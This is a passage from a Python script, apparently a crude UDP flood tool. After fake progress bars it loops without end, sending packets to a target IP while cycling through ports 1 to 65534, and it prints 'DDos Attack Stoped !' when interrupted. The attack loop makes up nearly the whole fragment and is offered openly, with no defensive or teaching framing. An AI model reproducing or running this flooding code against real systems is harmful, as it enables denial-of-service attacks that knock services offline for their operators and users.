int (ip)
print("======25%")
time.sleep(3)
print("==========50%")
time.sleep(5)
print("====================100%")
try:
    while True:
         sock.sendto(bytes, (ip,port))
         sent = sent + 1
         port = port + 1
         print ("Sended %s packets to %s to port:%s"%(sent,ip,port))
         if port == 65534:
           port = 1
except KeyboardInterrupt:
    os.system("figlet DDos Attack Stoped !")
    exit()
